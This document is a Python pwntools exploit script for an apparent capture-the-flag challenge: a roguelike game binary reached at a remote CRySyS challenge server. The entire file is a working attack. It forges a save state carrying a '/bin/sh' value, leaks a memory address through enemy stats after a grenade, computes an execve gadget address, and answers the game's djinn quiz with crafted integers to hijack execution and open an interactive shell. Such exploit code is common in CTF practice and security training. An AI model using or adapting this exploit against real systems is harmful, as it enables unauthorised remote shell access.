
import pwn
import sys
import re

pwn.context.log_level = 'error'

execve_gadget_addr = 0x00005555555633a3
alloc_dealloc_addr = 0x000055555556c5fe
bin_sh = 0x68732F6E69622F

def select_gender(conn, gender):
    conn.sendlineafter('>', gender)

def load_state(conn, weapon=0, armor=0, hp=0, healing_potions=0, poisons=0, gold=0, gender=0):
    conn.sendlineafter('>', '5')

    def lsb_hex(v):
        st = format(v, 'x').zfill(8)
        bytes = re.findall('..', st)
        return ''.join(bytes[::-1])

    save_state=''.join([lsb_hex(v) for v in [weapon, armor, hp, healing_potions, poisons, gold, gender]])
    conn.sendlineafter('state: ', save_state)


def buy_granade(conn):
    conn.sendlineafter('>', '1')
    conn.sendlineafter('What do you want to buy', '5')

def fight(conn):
    conn.sendlineafter('>', '2')

def defend(conn):
    conn.sendlineafter('>', '2')

def no_djinn(conn):
    conn.sendlineafter('Do you accept the djinn\'s offer?', 'no')

def yes_djinn(conn):
    conn.sendlineafter('Do you accept the djinn\'s offer?', 'yes')

def use_granade(conn):
    conn.sendlineafter('>', '5')

def parse_(conn):
    conn.sendlineafter('>', '1')
    conn.sendlineafter('What do you want to buy', '5')

def receive_int(conn, search_string):
    line = conn.recvline_contains(search_string).decode('utf-8')
    return int(re.search('[0-9]+', line).group())

def upper(addr):
    return addr >> 32

def lower(addr):
    return addr & 0xffffffff

def get_shell(conn):
    select_gender(conn, '1')

    hp = lower(bin_sh) * 2  # the lower 32 bits of the address has to be multiplied by 2, because djinn divides hp by 2.

    load_state(
        conn=conn,
        hp=hp,
        gold=0x66666666,
        gender=2
    )
   
    buy_granade(conn)

    fight(conn)

    no_djinn(conn)

    enemy_hp = receive_int(conn, 'Maximum hit points') 
    enemy_weapon = receive_int(conn, 'Weapon strength')

    use_granade(conn)

    current_alloc_dealloc_addr = (enemy_weapon << 32) + enemy_hp
    current_execve_gadget_addr = current_alloc_dealloc_addr - alloc_dealloc_addr + execve_gadget_addr

    fight(conn)
    yes_djinn(conn)

    for _ in range(15):
        line = conn.recvuntil('? ').decode('utf-8')

        if any([word in line for word in ['AAAAAAAA', 'Unix timestamp', 'Richard Stallman', 'even prime', '3↑↑3']]):
            conn.sendline('0')
        elif 'Rust' in line:
            conn.sendline(str(upper(bin_sh)))
        elif 'Linux released' in line:
            conn.sendline(str((lower(current_execve_gadget_addr) << 32) + 0x11111111))
        elif 'SecChallenge' in line:
            conn.sendline(str(upper(current_execve_gadget_addr)))
        else:
            conn.sendline('1')


    defend(conn)

    conn.interactive()

# conn = pwn.process('./rougelike.bin')
conn = pwn.remote('challenges.crysys.hu', 5008)

get_shell(conn)
